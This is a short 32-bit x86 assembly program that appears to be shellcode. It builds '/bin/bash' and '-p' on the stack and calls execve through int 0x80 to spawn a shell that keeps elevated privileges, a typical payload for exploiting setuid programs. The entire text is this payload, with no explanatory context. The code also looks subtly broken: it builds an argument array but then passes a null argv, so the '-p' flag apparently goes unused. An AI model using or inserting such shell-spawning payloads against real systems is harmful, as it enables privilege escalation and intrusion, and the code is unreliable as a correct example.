.globl	_start

_start:
	push $0x0
	push $0x702d
	mov %esp, %ecx
	push %edx
	push $0x68
	push $0x7361622f
	push $0x6e69622f
	mov %esp, %ebx
	push %edx
	push %ecx
	push %ebx
	xor %ecx, %ecx
	mov $0xb, %eax /* sys_execve */
	int $0x80
